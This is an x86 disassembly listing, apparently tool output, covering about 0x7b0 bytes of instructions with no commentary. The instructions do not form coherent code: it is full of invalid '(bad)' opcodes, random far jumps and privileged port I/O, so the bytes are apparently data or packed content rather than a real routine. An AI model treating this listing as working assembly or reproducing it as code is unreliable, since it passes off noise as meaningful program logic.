  402f52:	jmp    0x280c:0xd35e6769
  402f59:	xor    cl,BYTE PTR [eax-0x106378a0]
  402f5f:	jne    0x402f36
  402f61:	shl    BYTE PTR [eax],0xb9
  402f64:	dec    esp
  402f65:	pop    edx
  402f66:	aam    0x54
  402f68:	mov    ds:0x687a79e9,eax
  402f6d:	cmp    BYTE PTR [esi],ch
  402f6f:	jmp    0x99b8:0xa0352484
  402f76:	add    BYTE PTR [eax+0x10],bl
  402f79:	mov    cl,0x7a
  402f7b:	push   0x53
  402f7d:	ss loope 0x402fce
  402f80:	outs   dx,BYTE PTR ds:[esi]
  402f81:	add    DWORD PTR [edx-0x52],ebx
  402f84:	jnp    0x402faf
  402f86:	xchg   esp,eax
  402f87:	push   ss
  402f88:	sub    DWORD PTR [ecx-0x38],ebx
  402f8b:	xor    eax,0xd5768478
  402f90:	fadd   QWORD PTR [ecx]
  402f92:	push   edi
  402f93:	(bad)  
  402f94:	ret    0x8951
  402f97:	jns    0x402f2a
  402f99:	mov    ch,0xae
  402f9b:	xchg   ebx,eax
  402f9c:	add    DWORD PTR [edx-0x115db29e],ebx
  402fa2:	sti    
  402fa3:	repz or eax,0xa0c19966
  402fa9:	pop    ecx
  402faa:	aad    0x2f
  402fac:	ja     0x403002
  402fae:	dec    edi
  402faf:	cmp    al,0xed
  402fb1:	popf   
  402fb2:	sbb    DWORD PTR [esi+0x10],edi
  402fb5:	or     cl,BYTE PTR [edi-0x684fa1da]
  402fbb:	adc    DWORD PTR [esi-0x798c7ab6],edi
  402fc1:	test   DWORD PTR [edx],esi
  402fc3:	retf   0x1c58
  402fc6:	test   dh,0x84
  402fc9:	adc    al,BYTE PTR [eax+0x7b07d311]
  402fcf:	cmp    eax,0x3eb48fdc
  402fd4:	mov    edx,0x9bbce958
  402fda:	push   ds
  402fdb:	push   edi
  402fdc:	(bad)  
  402fdd:	fisub  WORD PTR [esi+0x30]
  402fe0:	push   es
  402fe1:	or     DWORD PTR [ebx+0x73ae4720],0x3c776f1c
  402feb:	add    DWORD PTR [esi-0x4e9f01a6],ebp
  402ff1:	jg     0x402f89
  402ff3:	xchg   ebp,eax
  402ff4:	add    DWORD PTR ds:0x3eebb59a,ecx
  402ffa:	dec    ebx
  402ffb:	jno    0x403037
  402ffd:	pop    esp
  402ffe:	iret   
  402fff:	mov    al,BYTE PTR [edx-0x3dd10639]
  403005:	cwde   
  403006:	scas   al,BYTE PTR es:[edi]
  403007:	adc    eax,0x9510af1d
  40300c:	fisub  DWORD PTR es:[ecx]
  40300f:	xor    DWORD PTR [ebx+ecx*1-0x20ba1952],0xea985460
  40301a:	xchg   edi,eax
  40301b:	adc    BYTE PTR ds:0x90fbe880,ch
  403021:	test   BYTE PTR [edi],al
  403023:	out    0xd1,al
  403025:	pop    edx
  403026:	outs   dx,DWORD PTR ds:[esi]
  403027:	pop    eax
  403028:	and    eax,0xe070dfd3
  40302d:	push   ebp
  40302e:	(bad)  
  40302f:	cli    
  403030:	cs pop ss
  403032:	je     0x403019
  403034:	inc    esp
  403035:	add    ch,BYTE PTR [eax+0x65]
  403038:	xor    dl,BYTE PTR [ecx-0xb]
  40303b:	dec    eax
  40303c:	push   cs
  40303d:	stos   DWORD PTR es:[edi],eax
  40303e:	inc    ebp
  40303f:	or     esp,edx
  403041:	lods   eax,DWORD PTR ds:[esi]
  403042:	sbb    dh,BYTE PTR [edi-0x421e2b38]
  403048:	pop    edx
  403049:	pushf  
  40304a:	dec    edi
  40304b:	hlt    
  40304c:	sub    ah,BYTE PTR [ecx]
  40304e:	stc    
  40304f:	add    al,BYTE PTR [esi-0xd6451fa]
  403055:	stos   DWORD PTR es:[edi],eax
  403056:	imul   eax,DWORD PTR [edi],0x43
  403059:	mov    ds:0x6c82f8ae,eax
  40305e:	mov    ch,0xfe
  403060:	nop
  403061:	sub    eax,0xe2f42e7f
  403066:	pop    eax
  403067:	sti    
  403068:	(bad)  
  403069:	cmp    dl,ah
  40306b:	xchg   esi,eax
  40306c:	xor    al,0x62
  40306e:	outs   dx,BYTE PTR ds:[esi]
  40306f:	mov    eax,ds:0x7b55f2b5
  403074:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403075:	aaa    
  403076:	inc    esi
  403077:	jmp    ebx
  403079:	cmc    
  40307a:	mov    edx,0x811b49a9
  40307f:	in     eax,dx
  403080:	and    BYTE PTR [esi],ah
  403082:	rol    BYTE PTR [edx],1
  403084:	mov    ch,dl
  403086:	push   ds
  403087:	das    
  403088:	and    eax,0x13dccc98
  40308d:	inc    ecx
  40308e:	pop    ecx
  40308f:	adc    DWORD PTR [ebp-0x41],ebp
  403092:	adc    al,0x95
  403094:	mov    esi,0xa3f1f85b
  403099:	test   DWORD PTR [eax-0x574d8c2a],esi
  40309f:	push   edi
  4030a0:	sub    BYTE PTR [edi],al
  4030a2:	mov    bl,0xfc
  4030a4:	jo     0x403061
  4030a6:	jl     0x403084
  4030a8:	nop
  4030a9:	or     eax,0x6a96f769
  4030ae:	sbb    al,0x65
  4030b0:	test   BYTE PTR [edi+0x5d],al
  4030b3:	push   es
  4030b4:	clc    
  4030b5:	add    al,0x35
  4030b7:	out    dx,eax
  4030b8:	ja     0x4030b5
  4030ba:	cmp    cl,bh
  4030bc:	aaa    
  4030bd:	out    dx,al
  4030be:	or     eax,0xb92a0b76
  4030c3:	daa    
  4030c4:	or     ch,dl
  4030c6:	sbb    al,BYTE PTR [esi-0x12]
  4030c9:	dec    cl
  4030cb:	cli    
  4030cc:	pop    edx
  4030cd:	test   eax,0xee9267f7
  4030d2:	aam    0xfe
  4030d4:	and    al,0x2e
  4030d6:	or     dh,ah
  4030d8:	inc    ecx
  4030d9:	nop
  4030da:	data16 jge 0x403126
  4030dd:	add    edi,edx
  4030df:	mov    bh,0xe0
  4030e1:	repz sub al,0x70
  4030e4:	pop    esi
  4030e5:	outs   dx,DWORD PTR ds:[esi]
  4030e6:	stos   DWORD PTR es:[edi],eax
  4030e7:	or     eax,0x21fd2353
  4030ec:	popa   
  4030ed:	out    0x25,eax
  4030ef:	(bad)  
  4030f0:	xchg   ecx,eax
  4030f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030f2:	clc    
  4030f3:	mov    eax,fs:0xcb52dd78
  4030f9:	imul   eax,ebp,0xffffff8f
  4030fc:	sahf   
  4030fd:	push   edi
  4030fe:	mov    edx,0x2dc710d9
  403103:	push   ds
  403104:	xchg   edx,eax
  403105:	xchg   esp,eax
  403106:	enter  0xf100,0xfc
  40310a:	(bad)  
  40310b:	mov    cl,BYTE PTR [eax+0x27]
  40310e:	add    BYTE PTR [edx],dl
  403110:	pusha  
  403111:	int    0x5b
  403113:	xchg   edi,eax
  403114:	push   esp
  403115:	pop    esi
  403116:	cmp    DWORD PTR [ebx-0x2260b59c],ebx
  40311c:	adc    eax,0x81e37988
  403121:	adc    DWORD PTR [edx+0x5d],0x77
  403125:	popf   
  403126:	int    0x44
  403128:	stc    
  403129:	or     ebp,DWORD PTR [edi+ebp*2+0x3f]
  40312d:	pop    DWORD PTR [eax+0x6d]
  403130:	or     ecx,ebp
  403132:	sub    al,BYTE PTR [ecx+eiz*2]
  403135:	outs   dx,BYTE PTR ds:[esi]
  403136:	xor    DWORD PTR [ebx+0x35],ebp
  403139:	retf   
  40313a:	pop    eax
  40313b:	fisttp WORD PTR [esi-0x155e4850]
  403141:	pop    edx
  403142:	mov    al,ds:0x31e46d95
  403147:	in     eax,dx
  403148:	fnsave [edi-0x3c]
  40314b:	xor    cl,BYTE PTR [eax]
  40314d:	push   ss
  40314e:	mov    ebp,DWORD PTR [edi]
  403150:	xchg   ebx,eax
  403151:	nop
  403152:	xor    ebp,DWORD PTR [ecx+ebx*4-0x62]
  403156:	iret   
  403157:	int    0x8b
  403159:	push   eax
  40315a:	or     bh,BYTE PTR [esi]
  40315c:	mov    esp,0x7f436535
  403161:	cmc    
  403162:	cwde   
  403163:	(bad)  
  403164:	fnstsw WORD PTR [ebx-0x44a7de78]
  40316a:	icebp  
  40316b:	jno    0x40319b
  40316d:	rcl    DWORD PTR [ebp-0x14],0x5a
  403171:	(bad)  
  403172:	inc    ebp
  403173:	inc    ebp
  403174:	mov    ebx,0x20a52dc
  403179:	stos   BYTE PTR es:[edi],al
  40317a:	sbb    DWORD PTR [edx-0x43f8c370],0x16
  403181:	xlat   BYTE PTR ds:[ebx]
  403182:	rcr    DWORD PTR [ebx+0x41e6056c],0x9f
  403189:	aaa    
  40318a:	jmp    DWORD PTR [esi+0x622c26c3]
  403190:	hlt    
  403191:	push   es
  403192:	dec    ecx
  403193:	add    DWORD PTR gs:[esi-0x3ffb6182],edx
  40319a:	mov    dl,0xdc
  40319c:	push   eax
  40319d:	dec    ebx
  40319e:	mov    ds:0x2ed478a,eax
  4031a3:	lods   eax,DWORD PTR ds:[esi]
  4031a4:	jge    0x403152
  4031a6:	jnp    0x40319f
  4031a8:	jmp    0x5e58:0x29931ca9
  4031af:	retf   
  4031b0:	iret   
  4031b1:	cli    
  4031b2:	sub    BYTE PTR [esi-0x72],0xb8
  4031b6:	adc    eax,0x676e18ff
  4031bb:	lods   al,BYTE PTR ds:[esi]
  4031bc:	ret    
  4031bd:	add    DWORD PTR [ecx-0x7a698c16],eax
  4031c3:	mov    ebx,0x91aa4573
  4031c8:	add    eax,DWORD PTR cs:[esi+0x2a]
  4031cc:	fdiv   QWORD PTR [ebx+0x3d]
  4031cf:	div    BYTE PTR [eax+eax*1-0x53]
  4031d3:	and    ebp,edx
  4031d5:	(bad)  
  4031d6:	and    cl,bh
  4031d8:	mov    bl,BYTE PTR [ebx+0x38]
  4031db:	es sub eax,0x9994230a
  4031e1:	enter  0xc03d,0x8b
  4031e5:	ins    DWORD PTR es:[edi],dx
  4031e6:	sar    ah,0x96
  4031e9:	clc    
  4031ea:	and    eax,0x8e67c21e
  4031ef:	add    al,0xe3
  4031f1:	push   ecx
  4031f2:	xchg   DWORD PTR [eax+0x6a],ebp
  4031f5:	inc    esp
  4031f6:	xor    DWORD PTR [ebx+ebx*2],ecx
  4031f9:	and    dl,cl
  4031fb:	test   ch,ch
  4031fd:	inc    eax
  4031fe:	jo     0x4031ae
  403200:	mov    ch,0xc8
  403202:	or     edx,0x406e838e
  403208:	clc    
  403209:	push   0xffffff9e
  40320b:	rcl    ebp,0xf6
  40320e:	jb     0x403242
  403210:	xlat   BYTE PTR ds:[ebx]
  403211:	(bad)  
  403212:	scas   eax,DWORD PTR es:[edi]
  403213:	jecxz  0x4031e2
  403215:	and    bh,0x86
  403218:	cmp    al,0x83
  40321a:	and    al,0x9a
  40321c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40321d:	and    ch,BYTE PTR gs:[ebx+0x5061f863]
  403224:	add    al,0x77
  403226:	xlat   BYTE PTR ds:[ebx]
  403227:	out    0xe4,al
  403229:	cmp    DWORD PTR [eax-0x3e],edx
  40322c:	enter  0x697d,0x86
  403230:	outs   dx,DWORD PTR gs:[esi]
  403232:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403233:	mov    cl,BYTE PTR [eax+0x40d660a1]
  403239:	out    0x2c,al
  40323b:	out    dx,al
  40323c:	jb     0x4032b8
  40323e:	jbe    0x403272
  403240:	cs pop edi
  403242:	(bad)  
  403243:	fimul  WORD PTR ds:[ebp-0x4034dfca]
  40324a:	repnz add eax,0x74083314
  403250:	xchg   edx,eax
  403251:	shl    BYTE PTR [ebp+0xb3e3316],0x8f
  403258:	pop    ds
  403259:	pushf  
  40325a:	outs   dx,BYTE PTR ds:[esi]
  40325b:	(bad)  
  40325c:	push   0xffffffe3
  40325e:	fdivr  DWORD PTR [edx-0x3]
  403261:	xchg   DWORD PTR [edi+0x5b72b764],esp
  403267:	imul   esp,ebx,0x72252edd
  40326d:	adc    al,BYTE PTR [ecx+edx*4]
  403270:	push   esp
  403271:	rcl    BYTE PTR [ecx-0x47533883],1
  403277:	or     DWORD PTR [edi],eax
  403279:	stos   BYTE PTR es:[edi],al
  40327a:	js     0x403295
  40327c:	sbb    BYTE PTR [edx-0xb],0x15
  403280:	in     al,0x6d
  403282:	jle    0x403258
  403284:	push   esp
  403285:	loope  0x403209
  403287:	iret   
  403288:	stc    
  403289:	retf   
  40328a:	or     dh,BYTE PTR [esi+0x7a]
  40328d:	retf   0x88b9
  403290:	fdiv   QWORD PTR [ecx+ebx*1+0x21]
  403294:	das    
  403295:	(bad)  
  403296:	sub    BYTE PTR [ebp+edi*2-0x625871a],cl
  40329d:	inc    ebp
  40329e:	pop    ds
  40329f:	xor    eax,DWORD PTR [ecx+ebp*2-0x1e7f0acf]
  4032a6:	(bad)  
  4032a7:	cld    
  4032a8:	sub    DWORD PTR [ebx+0x26],0xed5abdf4
  4032af:	data16 or dl,BYTE PTR [ebx+ebp*1-0x13bcc8fd]
  4032b7:	popf   
  4032b8:	in     eax,0x6f
  4032ba:	adc    eax,0xccbc3373
  4032bf:	jmp    0x1e4f:0x6d3b59c0
  4032c6:	mov    dl,0x20
  4032c8:	and    edx,ebx
  4032ca:	xor    DWORD PTR [ebx],edx
  4032cc:	jp     0x403281
  4032ce:	xchg   edi,eax
  4032cf:	pop    ebp
  4032d0:	retf   0xa001
  4032d3:	lahf   
  4032d4:	pop    ebp
  4032d5:	or     ebx,ebx
  4032d7:	and    BYTE PTR [edx+0x45],al
  4032da:	sti    
  4032db:	sti    
  4032dc:	mov    bh,0x55
  4032de:	cwde   
  4032df:	sar    esi,cl
  4032e1:	sub    DWORD PTR [edx],ebx
  4032e3:	adc    DWORD PTR [edx+0x5d],ebp
  4032e6:	inc    eax
  4032e7:	mov    ds:0xbfc6745f,al
  4032ec:	loope  0x40332b
  4032ee:	add    ebp,DWORD PTR [eax]
  4032f0:	xor    DWORD PTR [edx+0x189eabd],0x20d87656
  4032fa:	sbb    BYTE PTR [ecx+edi*8],ch
  4032fd:	jl     0x4032bf
  4032ff:	imul   esp,DWORD PTR [ecx+0x67b795f0],0xffffffca
  403306:	mov    ebp,0xa71d82d2
  40330b:	mov    dl,0x62
  40330d:	jp     0x4032f6
  40330f:	sub    DWORD PTR [ecx+0x5f15c2de],edx
  403315:	nop
  403316:	adc    eax,0x27eff74b
  40331b:	push   es
  40331c:	call   0xa46ca289
  403321:	dec    edi
  403322:	rol    BYTE PTR [eax+0x4e],cl
  403325:	xchg   eax,ecx
  403327:	sub    al,0x6c
  403329:	jmp    0xf64e3d98
  40332e:	pop    ebp
  40332f:	data16 and BYTE PTR [ebx],0xbc
  403333:	inc    edi
  403334:	mov    edx,DWORD PTR [ecx-0x1bbc5843]
  40333a:	mov    ebx,esp
  40333c:	mov    dl,0x81
  40333e:	loopne 0x40333b
  403340:	add    edx,edx
  403342:	adc    eax,0x1775eed9
  403347:	imul   ch
  403349:	ja     0x40331a
  40334b:	sub    edi,eax
  40334d:	or     eax,0x3f91a774
  403352:	fcmovne st,st(5)
  403354:	dec    esp
  403355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403356:	cdq    
  403357:	adc    cl,ch
  403359:	pushf  
  40335a:	fidiv  DWORD PTR [ecx+0xc]
  40335d:	gs xor al,0xe2
  403360:	es dec ebx
  403362:	inc    edi
  403363:	(bad)  
  403364:	dec    edx
  403365:	stos   DWORD PTR es:[edi],eax
  403366:	scas   al,BYTE PTR es:[edi]
  403367:	retf   
  403368:	xchg   edi,eax
  403369:	and    eax,DWORD PTR [edi]
  40336b:	jno    0x4033e3
  40336d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40336e:	push   esp
  40336f:	add    ecx,DWORD PTR [esi+ebx*8+0x29]
  403373:	xor    DWORD PTR [edi-0x63],ebx
  403376:	push   esi
  403377:	out    0xae,eax
  403379:	pop    ss
  40337a:	ret    
  40337b:	mov    WORD PTR [edi+0x30fd791d],?
  403381:	aam    0xde
  403383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403384:	mov    bh,0x33
  403386:	popf   
  403387:	rol    DWORD PTR [edi+ebp*2],1
  40338a:	ins    BYTE PTR es:[edi],dx
  40338b:	repz add BYTE PTR [edi+ebx*4+0x5c],cl
  403390:	cmp    ch,bl
  403392:	shl    ch,0xd8
  403395:	inc    ecx
  403396:	adc    esp,esi
  403398:	cmp    al,0xc6
  40339a:	jae    0x40339d
  40339c:	and    ch,BYTE PTR [edi-0x40]
  40339f:	and    DWORD PTR cs:[edx+0x39ca049d],eax
  4033a6:	cmp    BYTE PTR [eax-0x50],dl
  4033a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033aa:	outs   dx,DWORD PTR ds:[esi]
  4033ab:	not    ebx
  4033ad:	stos   BYTE PTR es:[edi],al
  4033ae:	hlt    
  4033af:	mov    eax,0x4ac4f9fa
  4033b4:	fist   DWORD PTR [ecx]
  4033b6:	push   edi
  4033b7:	adc    ecx,esi
  4033b9:	loope  0x4033d6
  4033bb:	and    ebx,DWORD PTR [edx+0x2312049f]
  4033c1:	push   esi
  4033c2:	push   ebp
  4033c3:	in     eax,dx
  4033c4:	jecxz  0x4033b2
  4033c6:	rcr    DWORD PTR [ecx-0x30ab0587],cl
  4033cc:	call   0x4e30328e
  4033d1:	pop    edi
  4033d2:	pusha  
  4033d3:	adc    al,0x56
  4033d5:	push   0xef7f2de1
  4033da:	out    0x9e,eax
  4033dc:	arpl   ax,dx
  4033de:	ffreep st(4)
  4033e0:	lock pop esp
  4033e2:	jb     0x4033b9
  4033e4:	xchg   DWORD PTR [eax-0x7b999353],ebx
  4033ea:	pusha  
  4033eb:	and    BYTE PTR [edx+0x4d85b245],ah
  4033f1:	adc    bh,dl
  4033f3:	fcmovnu st,st(2)
  4033f5:	jno    0x4033e4
  4033f7:	jae    0x4033fb
  4033f9:	fsubr  st(1),st
  4033fb:	imul   eax,DWORD PTR ss:[edi-0x56],0xffffffe0
  403400:	xor    eax,0xce7c5a8
  403405:	aad    0xb5
  403407:	je     0x403454
  403409:	test   esi,edx
  40340b:	into   
  40340c:	cwde   
  40340d:	jne    0x403407
  40340f:	dec    edx
  403410:	or     esi,ecx
  403412:	enter  0x116d,0xef
  403416:	popa   
  403417:	out    dx,al
  403418:	push   esi
  403419:	dec    esi
  40341a:	mov    dh,BYTE PTR [esi+eiz*4-0x2c7ef8d9]
  403421:	lea    esi,[ebx]
  403423:	rcr    cl,cl
  403425:	push   edi
  403426:	push   edx
  403427:	xor    al,0xd7
  403429:	xor    cl,BYTE PTR [ebp+0x4]
  40342c:	outs   dx,DWORD PTR ds:[esi]
  40342d:	shl    DWORD PTR [edx],0x22
  403430:	pusha  
  403431:	dec    ebx
  403432:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403434:	and    BYTE PTR [ebp+edi*1+0x7f9cb931],0x99
  40343c:	xchg   DWORD PTR [ecx-0x23],ebp
  40343f:	cmp    edi,DWORD PTR [edi]
  403441:	adc    ebx,ebp
  403443:	mov    edx,0x825f218d
  403448:	outs   dx,BYTE PTR ds:[esi]
  403449:	cmp    esp,esi
  40344b:	loope  0x4033ea
  40344d:	loope  0x40342a
  40344f:	push   esp
  403450:	idiv   DWORD PTR [edi-0x65]
  403453:	xchg   BYTE PTR [ebp+0x2c],ah
  403456:	fucomip st,st(0)
  403458:	pushf  
  403459:	imul   ebp,DWORD PTR [edx],0x656ea4a9
  40345f:	(bad)  
  403460:	cmp    al,0x84
  403462:	mov    ecx,0xc3fdf9a6
  403467:	cmp    ecx,ebx
  403469:	mov    esi,0xbea8645f
  40346e:	sbb    edx,DWORD PTR ds:0x31bb9dcd
  403474:	je     0x403408
  403476:	xor    eax,esp
  403478:	into   
  403479:	inc    ebx
  40347a:	cwde   
  40347b:	aam    0xd8
  40347d:	mov    ah,0xe1
  40347f:	or     BYTE PTR [edi-0x54acf754],dh
  403485:	ds into 
  403487:	sub    eax,0x5ac0da43
  40348c:	xchg   esi,eax
  40348d:	dec    esp
  40348e:	push   eax
  40348f:	in     eax,0x97
  403491:	cwde   
  403492:	push   0xece2b0d9
  403497:	jns    0x403511
  403499:	mov    ch,0xb1
  40349b:	std    
  40349c:	dec    edx
  40349d:	out    0xf8,al
  40349f:	retf   0xeaad
  4034a2:	sub    ebx,DWORD PTR [edx+0x42]
  4034a5:	adc    ebx,eax
  4034a7:	pavgb  mm7,QWORD PTR [eax-0x5]
  4034ab:	adc    bh,dh
  4034ad:	mov    ch,0xc3
  4034af:	mov    dl,0x5c
  4034b1:	sub    ebx,ebp
  4034b3:	jne    0x40350c
  4034b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034b6:	clc    
  4034b7:	out    dx,eax
  4034b8:	call   0x8c78:0xedfa7153
  4034bf:	dec    edx
  4034c0:	call   0x767e:0x2789922b
  4034c7:	enter  0xeb14,0x39
  4034cb:	add    DWORD PTR [ecx],ebx
  4034cd:	jl     0x4034e0
  4034cf:	in     eax,dx
  4034d0:	cmp    DWORD PTR [esi+0x47d97293],esp
  4034d6:	jne    0x40348e
  4034d8:	(bad)  
  4034d9:	aas    
  4034da:	xchg   esi,eax
  4034db:	push   esp
  4034dc:	jge    0x4034e6
  4034de:	and    esp,DWORD PTR [esp+eax*1+0x2f50d787]
  4034e5:	pop    edi
  4034e6:	mov    bl,0x6a
  4034e8:	adc    eax,0xd1693be6
  4034ed:	push   ss
  4034ee:	aas    
  4034ef:	push   edx
  4034f0:	(bad)  
  4034f1:	(bad)  
  4034f2:	push   edi
  4034f3:	jnp    0x403564
  4034f5:	sbb    eax,0xa514a30
  4034fa:	fisub  DWORD PTR [ecx-0x13e8fd5b]
  403500:	lods   al,BYTE PTR ds:[esi]
  403501:	pop    ds
  403502:	and    DWORD PTR [ecx],ecx
  403504:	inc    eax
  403505:	xchg   esp,eax
  403506:	jnp    0x4034ac
  403508:	mov    edi,0xbc18a28d
  40350d:	pop    edi
  40350e:	sbb    edx,esp
  403510:	pop    ebp
  403511:	mov    dl,BYTE PTR [eax]
  403513:	add    eax,0xe74b62a9
  403518:	outs   dx,BYTE PTR ds:[esi]
  403519:	add    DWORD PTR es:[edx+eax*2-0xcd02c1d],edx
  403521:	cs hlt 
  403523:	sahf   
  403524:	ja     0x4034aa
  403526:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403527:	test   eax,0x81ebca3a
  40352c:	fdivr  DWORD PTR [edi-0x76]
  40352f:	addr16 inc esp
  403531:	push   edi
  403532:	in     eax,0xf2
  403534:	into   
  403535:	mov    esi,0x18f56aeb
  40353a:	sbb    al,0x38
  40353c:	loopne 0x4035a9
  40353e:	outs   dx,DWORD PTR ds:[esi]
  40353f:	(bad)  
  403542:	pop    esi
  403543:	mov    eax,fs:0xe7bf3284
  403549:	xor    edx,ecx
  40354b:	test   al,0xab
  40354d:	add    eax,0x6928ffde
  403552:	mov    eax,ds:0x8e200515
  403557:	rol    DWORD PTR [edx+0x4c],cl
  40355a:	dec    edx
  40355b:	ror    DWORD PTR [ebx],cl
  40355d:	push   0x52
  40355f:	popa   
  403560:	sub    BYTE PTR [ebx+edi*2+0x58],bh
  403564:	aam    0x55
  403566:	push   0xffffffd4
  403568:	(bad)  
  403569:	jle    0x40356e
  40356b:	hlt    
  40356c:	sbb    DWORD PTR [eax-0x5b],edx
  40356f:	call   0x296111c3
  403574:	or     ebx,DWORD PTR [ebx-0x3]
  403577:	dec    ecx
  403578:	jl     0x403524
  40357a:	clc    
  40357b:	sahf   
  40357c:	shl    eax,cl
  40357e:	cmp    al,0xb6
  403580:	aam    0xb3
  403582:	and    ah,bl
  403584:	push   edi
  403585:	push   0x4b
  403587:	push   ebp
  403588:	inc    ch
  40358a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40358b:	sbb    al,0xee
  40358d:	scas   al,BYTE PTR es:[edi]
  40358e:	dec    edi
  40358f:	push   0xfb9fa7ba
  403594:	sub    ebx,DWORD PTR [eax-0x6d92211e]
  40359a:	stc    
  40359b:	jge    0x403539
  40359d:	div    BYTE PTR ds:0xf076a470
  4035a3:	outs   dx,BYTE PTR ds:[esi]
  4035a4:	cmp    al,0x41
  4035a6:	loopne 0x40354f
  4035a8:	fwait
  4035a9:	data16 adc BYTE PTR [edx-0x60],cl
  4035ad:	push   cs
  4035ae:	mov    ecx,eax
  4035b0:	push   ebx
  4035b1:	adc    al,0x1c
  4035b3:	in     eax,dx
  4035b4:	aaa    
  4035b5:	fld    TBYTE PTR [eax-0x66]
  4035b8:	je     0x403624
  4035ba:	xchg   ebx,eax
  4035bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035bc:	inc    edi
  4035bd:	mov    eax,0x1af406c
  4035c2:	nop
  4035c3:	mov    eax,ds:0x6d23fb26
  4035c8:	push   esp
  4035c9:	push   edx
  4035ca:	pop    ecx
  4035cb:	and    dh,BYTE PTR [eax+0x30]
  4035ce:	rol    eax,1
  4035d0:	test   eax,0x66c33824
  4035d5:	fidivr WORD PTR [ebx]
  4035d7:	lods   al,BYTE PTR ds:[esi]
  4035d8:	sub    dl,0x90
  4035db:	sub    BYTE PTR [ecx+0x15eb8641],0x37
  4035e2:	dec    edx
  4035e3:	lahf   
  4035e4:	sti    
  4035e5:	int    0xd
  4035e7:	or     eax,0xe64c7d2
  4035ec:	les    esi,FWORD PTR [esi]
  4035ee:	jp     0x4035a2
  4035f0:	xor    eax,0x775581f7
  4035f5:	sti    
  4035f6:	xchg   edx,eax
  4035f7:	gs jmp 0x403592
  4035fa:	adc    al,0xc3
  4035fc:	and    DWORD PTR [esi-0x1f],0x84054658
  403603:	loopne 0x403635
  403605:	dec    ebp
  403606:	jl     0x403631
  403608:	add    dl,BYTE PTR [esi-0x24]
  40360b:	shl    BYTE PTR [eax+0x3a],0xc6
  40360f:	test   al,0x76
  403611:	into   
  403612:	clc    
  403613:	adc    BYTE PTR [ebp-0x3df7716c],ch
  403619:	hlt    
  40361a:	mov    cs,esp
  40361c:	addr16 cmp al,0xb2
  40361f:	and    al,0x29
  403621:	aad    0x9f
  403623:	xlat   BYTE PTR ds:[ebx]
  403624:	cmp    al,0x14
  403626:	mov    esp,0xd61509b4
  40362b:	dec    ebx
  40362c:	mov    BYTE PTR [ebx+edx*8-0xea3d3b2],ch
  403633:	jne    0x4035c1
  403635:	xchg   esi,eax
  403636:	pop    esi
  403637:	add    ch,bl
  403639:	and    ecx,edx
  40363b:	xchg   al,dl
  40363d:	xchg   BYTE PTR [edi+0x4a55739a],dl
  403643:	int3   
  403644:	aas    
  403645:	xor    DWORD PTR [edx+0x326f3c87],esi
  40364b:	inc    ecx
  40364c:	push   0x57
  40364e:	fucomi st,st(6)
  403650:	push   eax
  403651:	xchg   ebx,eax
  403652:	sub    dl,BYTE PTR [edi]
  403654:	ins    BYTE PTR es:[edi],dx
  403655:	or     dl,bl
  403657:	mov    ecx,0x27e651cb
  40365c:	push   cs
  40365d:	push   edx
  40365e:	(bad)  
  40365f:	and    BYTE PTR [edx],0x0
  403662:	add    ecx,edx
  403664:	call   FWORD PTR [ebx-0x71]
  403667:	mov    cl,0xee
  403669:	enter  0x4268,0xcf
  40366d:	xlat   BYTE PTR ds:[ebx]
  40366e:	sbb    al,BYTE PTR [esi-0x7e]
  403671:	fild   WORD PTR [eax+ebp*8]
  403674:	jb     0x4036d2
  403676:	jmp    0x6b13:0xc0f4b98
  40367d:	out    dx,eax
  40367e:	jne    0x4036de
  403680:	pop    ecx
  403681:	add    al,0xac
  403683:	sbb    eax,0xd43b79a5
  403688:	push   0xeaa29b51
  40368d:	or     ecx,esp
  40368f:	into   
  403690:	dec    ebp
  403691:	add    al,0x6a
  403693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403694:	icebp  
  403695:	jnp    0x4036bb
  403697:	gs stos BYTE PTR es:[edi],al
  403699:	jmp    0xe5127317
  40369e:	or     ecx,DWORD PTR [bx+si+0x48]
  4036a2:	jae    0x4036bc
  4036a4:	inc    ecx
  4036a5:	fwait
  4036a6:	icebp  
  4036a7:	mov    edi,0x440c102d
  4036ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036ad:	and    edi,esp
  4036af:	rcl    BYTE PTR [ecx+0x1b],0x15
  4036b3:	mov    bh,0x82
  4036b5:	int3   
  4036b6:	push   edx
  4036b7:	hlt    
  4036b8:	add    DWORD PTR [edx-0x46],edx
  4036bb:	xor    esi,0x22
  4036be:	push   edi
  4036bf:	clc    
  4036c0:	ins    DWORD PTR es:[edi],dx
  4036c1:	imul   esi,ebx,0x7cc65e16
  4036c7:	test   DWORD PTR [edi],0x7f6366aa
  4036cd:	push   edx
  4036ce:	test   DWORD PTR [eax+0x4a],edi
  4036d1:	icebp  
  4036d2:	retf   
  4036d3:	lods   eax,DWORD PTR ds:[esi]
  4036d4:	push   cs
  4036d5:	test   DWORD PTR [eax+0x65cbb14a],edx
  4036db:	add    ecx,DWORD PTR [edx]
  4036dd:	jae    0x4036f3
  4036df:	outs   dx,BYTE PTR ds:[esi]
  4036e0:	pushf  
  4036e1:	mov    WORD PTR [edx-0x4],?
  4036e4:	in     eax,0x20
  4036e6:	and    BYTE PTR [eax],al
  4036e8:	mov    bl,0xc0
  4036ea:	fidivr DWORD PTR [edx+0x12ba31c2]
  4036f0:	sub    al,BYTE PTR [esp+ecx*8-0x41]
  4036f4:	retf   
  4036f5:	out    dx,al
  4036f6:	jnp    0x403729
  4036f8:	cmp    esi,DWORD PTR [esi]
  4036fa:	sbb    al,BYTE PTR [edi+0x5f]
  4036fd:	pushf  
  4036fe:	cmc    
  4036ff:	jb     0x40376a
  403701:	clc    
  403702:	add    bh,al
